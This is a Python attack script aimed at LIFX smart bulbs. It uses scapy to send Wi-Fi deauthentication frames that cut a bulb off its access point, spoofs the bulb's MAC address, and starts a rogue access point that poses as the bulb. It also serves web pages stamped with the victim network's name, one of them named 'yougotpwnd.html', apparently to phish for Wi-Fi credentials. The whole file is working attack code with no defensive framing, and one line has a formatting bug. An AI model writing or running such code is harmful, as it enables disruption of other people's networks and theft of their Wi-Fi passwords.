from scapy.all import *
import csv
import pandas as pd
from scapy.all import *
from scapy.layers.dot11 import Dot11, RadioTap, Dot11Deauth
#put laptop into monitor mode

df = pd.read_csv("firstcap-18.csv")
targetlist = df[df['BSSID'].str.contains("D0:73:D5")].reset_index()

lifxmac = targetlist['BSSID'][0]
accespointmac = targetlist[' Privacy'][0].replace(' ', '')

targetlist2 = df[df['BSSID'].str.contains(accespointmac)].reset_index()

accesspointssid = targetlist2[' ESSID'][0]
print(targetlist)
print(accesspointssid, accespointmac)
os.system("sudo airmon-ng check kill")
os.system("sudo ifconfig wlan0 down")
os.system("sudo iwconfig wlan0 mode monitor")
lifxmac1 = "d0:73:d5:01:01:01"
lifxmac2 = "d0:73:d5:01:01:02"
if lifxmac == lifxmac1:
    os.system("macchanger -m [0] wlan0.format".format(lifxmac2))
else:
    os.system("macchanger -m {0} wlan0".format(lifxmac1))
os.system("sudo ifconfig wlan0 up")

target_mac = lifxmac
gateway_mac = accespointmac
dot11 = Dot11(addr1=target_mac, addr2=gateway_mac, addr3=gateway_mac)
packet = RadioTap()/dot11/Dot11Deauth(reason=7)
sendp(packet, inter=0.1, count=1, iface="wlan0", verbose=1)

target_mac = "ff:ff:ff:ff:ff:ff"
gateway_mac = lifxmac
dot11 = Dot11(addr1=target_mac, addr2=gateway_mac, addr3=gateway_mac)
packet = RadioTap()/dot11/Dot11Deauth(reason=7)
sendp(packet, inter=0.1, count=1, iface="wlan0", verbose=1)

os.remove("hostapd.conf")
f = open("hostapd.conf", "a")
f.write("interface=wlan0\ndriver=nl80211\nssid=LIFX Bulb {0} \nhw_mode=g\nchannel=3\nmacaddr_acl=0\nignore_broadcast_ssid=0".format(lifxmac[9:17].replace(':', '').lower()))
f.close()

os.system("sudo sed -i '19s/.*/        <p class=\"serial\">Serial Number: LIFX Bulb {0}<\/p>/g' ./index.html".format(lifxmac[9:17].replace(':', '').lower()))
os.system("sudo sed -i '23s/.*/    <p class=\"white largetext padding_top_5 padding_left_20\">{0}<\/p>/g' ./index.html".format(accesspointssid))
os.system("sudo sed -i '19s/.*/    <p class=\"white largetext padding_top_5 padding_left_20\">{0}<\/p>/g' ./yougotpwnd.html".format(accesspointssid))


os.system("ifconfig wlan0 up 172.16.0.1 netmask 255.255.255.0")
os.system("route add -net 172.16.0.0 netmask 255.255.255.0 gw 172.16.0.1")
os.system("dnsmasq -C dnsmasq.conf")
os.system("sudo service apache2 start")
#os.system("source /etc/apache2/envvars")
#os.system("sudo apache2 -f /etc/apache2/sites-enabled/000-default.conf -k start")

os.system("hostapd hostapd.conf")